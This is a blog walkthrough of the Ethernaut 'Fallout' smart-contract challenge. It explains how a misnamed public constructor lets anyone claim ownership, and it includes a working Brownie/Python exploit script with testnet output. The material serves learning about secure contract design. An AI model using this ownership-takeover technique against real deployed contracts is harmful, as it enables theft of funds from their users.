<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
<head>
  <meta charset="utf-8" />

  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <link rel="icon" href="/favicon.ico">

  <title>
    Ethernaut - Level 02 - Fallout - Security Pills
  </title>

  <meta name="description" content="Image courtesy of OpenZeppelin
Ethernaut 02 - Fallout The goal for this level is to claim ownership of the contract, which has the following implementation:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &#34;caller is not the owner&#34; ); _; } function allocate() public payable { allocations[msg." /><meta name="generator" content="Hugo 0.102.3" />

  <link rel="stylesheet" href="https://securitypills.github.io/css/main.css" />

  
  

  <meta property="og:title" content="Ethernaut - Level 02 - Fallout" />
<meta property="og:description" content="Image courtesy of OpenZeppelin
Ethernaut 02 - Fallout The goal for this level is to claim ownership of the contract, which has the following implementation:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &#34;caller is not the owner&#34; ); _; } function allocate() public payable { allocations[msg." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://securitypills.github.io/articles/ethernaut-2-fallout/" /><meta property="article:section" content="articles" />
<meta property="article:published_time" content="2022-08-02T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-08-02T00:00:00+00:00" />



  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Ethernaut - Level 02 - Fallout"/>
<meta name="twitter:description" content="Image courtesy of OpenZeppelin
Ethernaut 02 - Fallout The goal for this level is to claim ownership of the contract, which has the following implementation:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &#34;caller is not the owner&#34; ); _; } function allocate() public payable { allocations[msg."/>


  <meta itemprop="name" content="Ethernaut - Level 02 - Fallout">
<meta itemprop="description" content="Image courtesy of OpenZeppelin
Ethernaut 02 - Fallout The goal for this level is to claim ownership of the contract, which has the following implementation:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &#34;caller is not the owner&#34; ); _; } function allocate() public payable { allocations[msg."><meta itemprop="datePublished" content="2022-08-02T00:00:00+00:00" />
<meta itemprop="dateModified" content="2022-08-02T00:00:00+00:00" />
<meta itemprop="wordCount" content="923">
<meta itemprop="keywords" content="" />

  <meta itemprop="name" content="Ethernaut - Level 02 - Fallout">
<meta itemprop="description" content="Image courtesy of OpenZeppelin
Ethernaut 02 - Fallout The goal for this level is to claim ownership of the contract, which has the following implementation:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &#34;caller is not the owner&#34; ); _; } function allocate() public payable { allocations[msg."><meta itemprop="datePublished" content="2022-08-02T00:00:00+00:00" />
<meta itemprop="dateModified" content="2022-08-02T00:00:00+00:00" />
<meta itemprop="wordCount" content="923">
<meta itemprop="keywords" content="" />
</head><body class="flex relative h-full min-h-screen"><aside
  class="will-change-transform transform transition-transform -translate-x-full absolute top-0 left-0 md:relative md:translate-x-0 w-3/4 md:w-60 h-full min-h-screen p-3 bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 flex flex-col gap-2.5 z-20 sidebar">
  <p class="font-bold mb-5 flex items-center gap-2">
    <button
      aria-label="Close sidebar"
      class="md:hidden menu-trigger-close p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-6 w-6" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <line x1="18" y1="6" x2="6" y2="18" />
  <line x1="6" y1="6" x2="18" y2="18" />
</svg></button>
    <a href="https://securitypills.github.io/" class="px-2">
    <span>Security Pills</span>
    
    </a>
    
    <button
      aria-label="Toggle dark mode"
      class="dark-mode-toggle p-2 rounded border dark:border-slate-700 hover:bg-slate-200 dark:hover:bg-slate-700"><svg class="h-4 w-4" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <circle cx="12" cy="12" r="4" />
  <path d="M3 12h1M12 3v1M20 12h1M12 20v1M5.6 5.6l.7 .7M18.4 5.6l-.7 .7M17.7 17.7l.7 .7M6.3 17.7l-.7 .7" />
</svg></button>
  
  </p>

  
  <ul class="list-none flex flex-col gap-1">
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/" >
        <span>Home</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles" >
        <span>Blog</span>
        
      </a>
    </li>
    
    <li>
      <a class="px-2 py-1.5 rounded-md text-sm flex items-center justify-between  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/portfolio" >
        <span>Newsletter</span>
        
      </a>
    </li>
    
  </ul>

  <div class="flex-1"></div>

  <div class="revue-widget">
  <form action="https://embeds.beehiiv.com/3645f86f-e3bb-46cb-adec-b3b2f20c9411?slim=true" method="post" name="revue-form" target="_blank">
    <div class="text-bold text-sm">Subscribe to my newsletter</div>
    
    <p class="text-xs my-1 text-slate-500">A weekly newsletter for smart and curious people interested in security, technology, and smartcontracts</p>
    
    <div class="mt-2">
      <input type="email" class="w-full px-1.5 py-0.5 text-sm rounded border dark:border-slate-700 dark:bg-slate-600" name="member[email]" id="member_email" placeholder="Your email address...">
      <input type="submit" class="mt-2 w-full text-center text-sm bg-slate-800 text-white dark:bg-slate-50 dark:text-slate-800 py-1 rounded" name="member[subscribe]" id="member_submit" value="Subscribe">
    </div>
  </form>
</div>

  <ul class="list-none flex flex-wrap justify-center gap-1 pt-2 border-t border-slate-200 dark:border-slate-600">
    
  </ul>
</aside>

<div
  class="fixed bg-slate-700 bg-opacity-5 transition duration-200 ease-in-out inset-0 z-10 pointer-events-auto md:hidden left-0 top-0 w-full h-full hidden menu-overlay">
</div>

<button
  aria-label="Toggle Sidebar"
  class="md:hidden absolute top-3 left-3 z-10 menu-trigger p-1 rounded text-slate-800 dark:text-slate-50 hover:bg-slate-100"><svg class="h-6 w-6" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
  fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" />
  <line x1="4" y1="6" x2="20" y2="6" />
  <line x1="4" y1="12" x2="20" y2="12" />
  <line x1="4" y1="18" x2="16" y2="18" />
</svg></button><div class="flex-1">



<div class="flex h-screen relative">

  <section
    class="will-change-transform transform transition-transform -translate-x-[200%] absolute top-0 left-0 lg:relative
  lg:translate-x-0 lg:min-w-[400px] lg:w-1/4 h-full bg-slate-50 dark:bg-slate-800 border-r border-slate-200 dark:border-slate-700 lg:flex flex-col py-3 overflow-y-auto scroll-area">
    
    
    <a href="https://securitypills.github.io/articles/">
      <h2 class="font-bold mb-5 py-1 pl-12 pr-3 md:px-3">Articles</h2>
    </a>
    <div class="space-y-2.5">
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut-5-token/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 05 - Token</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 05 - Token This level from Ethernaut, called Token, is a good exercise to become familiar with the integer underflow and integer overflow concepts. In this challenge you are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large number of tokens.
// SPDX-License-Identifier: MIT pragma solidity ^0.
        </div>
      </a>
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut-4-telephone/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 04 - Telephone</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 04 - Telephone This level from Ethernaut, called Telephone, is a good exercise to learn the nuances between tx.origin and msg.sender and why you should never use tx.origin for authentication purposes:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Telephone { address public owner; constructor() public { owner = msg.sender; } function changeOwner(address _owner) public { if (tx.origin != msg.sender) { owner = _owner; } } } Solidity has a global variable, tx.
        </div>
      </a>
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut-3-coinflip/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 03 - Coinflip</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 03 - Coinflip The third level in Ethernaut, CoinFlip, is a good exercise that will teach you how to exploit pseudo randomness implementations in smart contracts. This contract will require you to correctly guess the outcome of a coin flip ten times in a row:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract CoinFlip { using SafeMath for uint256; uint256 public consecutiveWins; uint256 lastHash; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor() public { consecutiveWins = 0; } function flip(bool _guess) public returns (bool) { uint256 blockValue = uint256(blockhash(block.
        </div>
      </a>
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut Challenges</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Please read This is a work in progress article that will receive updates as we continue publishing detailed walkthroughs for each level.
Ethernaut is OpenZeppelin Web3/Solidity based wargame to learn about Ethereum smart contract security and become familiar with programming principles in Solidity.
Although the game was launched few years ago it has become a good place to start for those who are interested on security and smart contracts.
Challenges are currently running on the Rinkeby testnet and you will require to use a Rinkey Faucet to get free testnet ETH and test the smart contracts.
        </div>
      </a>
      
      <a class="block px-3 py-4  hover:bg-slate-200 dark:hover:bg-slate-700 "
        href="/articles/ethernaut-1-fallback/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 01 - Fallback</h3>
        <div
          class="text-sm  text-slate-500 dark:text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 01 - Fallback The first level from Ethernaut is pretty straightforward and we will use it to become familiar with some Solidity concepts and the Brownie framework that we will use to complete this challenge.
The code for the smart contract that we must exploit is shown above:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallback { using SafeMath for uint256; mapping(address =&gt; uint) public contributions; address payable public owner; constructor() public { owner = msg.
        </div>
      </a>
      
      <a class="block px-3 py-4  bg-slate-900 dark:bg-slate-700 text-slate-50 "
        href="/articles/ethernaut-2-fallout/">
        
        
        <h3 class="text-lg font-semibold mb-0.5">Ethernaut - Level 02 - Fallout</h3>
        <div
          class="text-sm  text-slate-400  line-clamp-2">
          Image courtesy of OpenZeppelin
Ethernaut 02 - Fallout The goal for this level is to claim ownership of the contract, which has the following implementation:
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; import &#39;@openzeppelin/contracts/math/SafeMath.sol&#39;; contract Fallout { using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable { owner = msg.sender; allocations[owner] = msg.value; } modifier onlyOwner { require( msg.sender == owner, &#34;caller is not the owner&#34; ); _; } function allocate() public payable { allocations[msg.
        </div>
      </a>
      </div>
    </section>

  <div class="overflow-y-auto h-screen w-full">
    <article class="px-6 py-20 w-full mx-auto prose lg:prose-lg h-fit dark:prose-invert prose-img:mx-auto">

      
      <h1 class="!mb-2">Ethernaut - Level 02 - Fallout</h1>
      
      <p class="text-sm text-slate-500 !mb-8">August 2, 2022</p>
      

      

      <figure><img src="../images/fallout-2.svg"
         alt="Image courtesy of OpenZeppelin"/><figcaption>
            <p>Image courtesy of OpenZeppelin</p>
        </figcaption>
</figure>

<h2 id="ethernaut-02---fallout">Ethernaut 02 - Fallout</h2>
<p>The goal for this level is to claim ownership of the contract, which has the following implementation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Fallout</span> {
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mapping</span> (<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) allocations;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> owner;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* constructor */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Fal1out</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
</span></span><span style="display:flex;"><span>    allocations[owner] <span style="color:#f92672">=</span> msg.value;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">onlyOwner</span> {
</span></span><span style="display:flex;"><span>	        require(
</span></span><span style="display:flex;"><span>	            msg.sender <span style="color:#f92672">==</span> owner,
</span></span><span style="display:flex;"><span>	            <span style="color:#e6db74">&#34;caller is not the owner&#34;</span>
</span></span><span style="display:flex;"><span>	        );
</span></span><span style="display:flex;"><span>	        <span style="color:#66d9ef">_</span>;
</span></span><span style="display:flex;"><span>	    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">allocate</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
</span></span><span style="display:flex;"><span>    allocations[msg.sender] <span style="color:#f92672">=</span> allocations[msg.sender].add(msg.value);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendAllocation</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> allocator) <span style="color:#66d9ef">public</span> {
</span></span><span style="display:flex;"><span>    require(allocations[allocator] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    allocator.transfer(allocations[allocator]);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">collectAllocations</span>() <span style="color:#66d9ef">public</span> onlyOwner {
</span></span><span style="display:flex;"><span>    msg.sender.transfer(<span style="color:#66d9ef">address</span>(this).balance);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">allocatorBalance</span>(<span style="color:#66d9ef">address</span> allocator) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> allocations[allocator];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Contrarily to the previous level, this one is really simple and will teach us about constructors and the <code>public</code> modifier in Solidity.</p>
<p>Ethernaut challenges recreate issues that may no longer exist in recent versions of Solidity, but still are a good exercise on how to securely code smart contracts.</p>
<p>Up to Solidity 0.4.21, constructors could be defined using the same name of its contract name, although this could cause unintended bugs when contracts were renamed and their constructors were not.</p>
<p>Precisely to avoid this behavior Solidity introduced the <code>constructor</code> keyword. Which according to Solidity&rsquo;s documentation, constructors are caracterized for:</p>
<ul>
<li>Being optional functions which are executed upon contract creation, and can be used to run contract initialisation code</li>
<li>Before the constructor code is executed, state variables are initialised to their specified value (inline), or their default value.</li>
<li>If there is no constructor, the contract will assume thhe default constructor, equivalent to <code>constructor() {}</code>.</li>
</ul>
<p>Additionally, Solidity has four types of visibility for functions:</p>
<ul>
<li><strong>external</strong> &ndash; Part of the contract interface, and therefore can be called from other contracts and via transactions, with the unusual characteristic that external functions <strong>cannot be called internally</strong>.</li>
<li><strong>public</strong> &ndash; Also part of the contract interface, <strong>can be called internally</strong> or via message calls</li>
<li><strong>internal</strong> &ndash; Can only be accessed from within the current contract or contracts deriving from it. They cannot be accessed externally.</li>
<li><strong>private</strong> &ndash; Functions are not visible in derived contracts.</li>
</ul>
<p>Understanding these concepts will help us complete this challenge.</p>
<h2 id="where-is-the-vulnerability">Where is the vulnerability?</h2>
<p>One particular thing that should get our attention is the contract&rsquo;s name, and the comment before the <code>Fal1out</code> method declaration:</p>
<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex; background-color:#3c3d38"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Fallout</span> {
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mapping</span> (<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) allocations;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> <span style="color:#66d9ef">public</span> owner;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex; background-color:#3c3d38"><span>  <span style="color:#75715e">/* constructor */</span>
</span></span><span style="display:flex; background-color:#3c3d38"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Fal1out</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;
</span></span><span style="display:flex;"><span>    allocations[owner] <span style="color:#f92672">=</span> msg.value;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>As mentioned before, Solidity versions prior 0.5.0, required a constructor to be called with the same name as the contract, however, the security issue with this contract is that there is a typo and the function that should act as constructor has been named <code>Fal1out</code>, rather than <code>Fallout</code>, and uses the <code>public</code> attribute, meaning, it can be called by anyone.</p>
<p>If we review its code, whoever calls the <code>Fal1out</code> method will become its legitimate owner and therefore will be able to drain its funds.</p>
<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex; background-color:#3c3d38"><span>    owner <span style="color:#f92672">=</span> msg.sender;
</span></span><span style="display:flex;"><span>    allocations[owner] <span style="color:#f92672">=</span> msg.value;
</span></span></code></pre></div><p>This vulnerability is rare to occur in recent versions of Solidity, since contracts are now forced to use the <code>constructor</code> keyword.</p>
<p>Something as simple as this is what happened with the Rubixi incidence, where the developer renamed the contract’s name from <code>DynamicPyramid</code> to <code>Rubixi</code>, but forgot to rename the constructor function from <code>DynamicPyramid()</code> to <code>Rubixi()</code> and as result attackers could publicly invoke the <code>DynamicPyramic()</code> function and obtain control of the contract, transferring its ethers out.</p>
<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex; background-color:#3c3d38"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Rubixi</span> {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//Declare variables for storage critical to contract
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">private</span> balance <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">private</span> collectedFees <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">private</span> feePercent <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">private</span> pyramidMultiplier <span style="color:#f92672">=</span> <span style="color:#ae81ff">300</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">private</span> payoutOrder <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">private</span> creator;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">//Sets creator
</span></span></span><span style="display:flex; background-color:#3c3d38"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">DynamicPyramid</span>() {
</span></span><span style="display:flex; background-color:#3c3d38"><span>                creator <span style="color:#f92672">=</span> msg.sender;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>...omitted <span style="color:#66d9ef">for</span> brevity...
</span></span></code></pre></div><p><strong>See the similarities?</strong> Now let&rsquo;s explain how to exploit this contract!</p>
<h2 id="hacking-the-contract">Hacking the contract</h2>
<p>Following our steps from previous level, we will continue using brownie for the exploitation of this contract.</p>
<p>For this particular level we will create a simple interface which require access to the <code>owner()</code> and <code>Fal1out()</code> function, as shown below:</p>
<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">IFallout</span> {
</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">owner</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span>);
</span></span><span style="display:flex; background-color:#3c3d38"><span>    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Fal1out</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Our script to attack the contract and drain all the Ethers will be pretty straightforward:</p>
<div class="highlight" lineos="table" lineofstart="1"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> brownie <span style="color:#f92672">import</span> accounts, config, interface, web3, Fallout
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attack</span>(target, hacker):
</span></span><span style="display:flex;"><span>    fallout <span style="color:#f92672">=</span> interface<span style="color:#f92672">.</span>IFallout(target)
</span></span><span style="display:flex; background-color:#3c3d38"><span>    fallout<span style="color:#f92672">.</span>Fal1out({<span style="color:#e6db74">&#34;from&#34;</span>: hacker})
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Owner is hacker: </span><span style="color:#e6db74">{</span>fallout<span style="color:#f92672">.</span>owner() <span style="color:#f92672">==</span> hacker<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(target):
</span></span><span style="display:flex;"><span>    hacker <span style="color:#f92672">=</span> accounts<span style="color:#f92672">.</span>add(config[<span style="color:#e6db74">&#39;wallets&#39;</span>][<span style="color:#e6db74">&#39;from_key&#39;</span>])
</span></span><span style="display:flex;"><span>    attack(target, hacker)
</span></span></code></pre></div><p>In this case we have a <code>main</code> function which receives as parameter the contract’s address that we are aiming to attack, and the <code>attack</code> method, which receives the <code>target</code> and <code>hacker</code> parameters. This method is the one that will claim ownership of the contract right after calling its constructor through the <code>fallout.Fal1out</code> call, as shown below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@vmi828562 ~/r/e/fallout-02 <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span><span style="color:#75715e"># brownie run attack main &#34;0xD48037e289Be89083bE8e58dFC74bd578D6523e3&#34; --network rinkeby</span>
</span></span><span style="display:flex;"><span>Brownie v1.18.1 - Python development framework <span style="color:#66d9ef">for</span> Ethereum
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Fallout02Project is the active project.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#e6db74">&#39;scripts/attack.py::main&#39;</span>...
</span></span><span style="display:flex;"><span>Transaction sent: 0x11be0d3bac8cc87cfa19b8bf03a4ecc7760b441d6ab6d0b5e801a0f436ea9300
</span></span><span style="display:flex;"><span>  Gas price: 1.16223081 gwei   Gas limit: <span style="color:#ae81ff">50442</span>   Nonce: <span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span>  Transaction confirmed   Block: <span style="color:#ae81ff">10722650</span>   Gas used: <span style="color:#ae81ff">45767</span> <span style="color:#f92672">(</span>90.73%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Owner is hacker: True
</span></span></code></pre></div><h2 id="takeaways">Takeaways</h2>
<p>As usual, we like to wrap up each challenge with some recommendations or lessons learnt. In this case I think the most valuable lesson is to learn about what constructors are and how they should be declared.</p>
<p>But it is also a good opportunity to introduce <a href="https://consensys.net/diligence/tools/"  target="_blank" rel="noopener" >security analysis tools</a> that can help us discover vulnerabilities in our Ethereum smart contract code during its development life cycle.</p>

    </article>
  </div>

</div>


  </div>
<script type="text/javascript" src="/main.js" defer></script>


</body>

</html>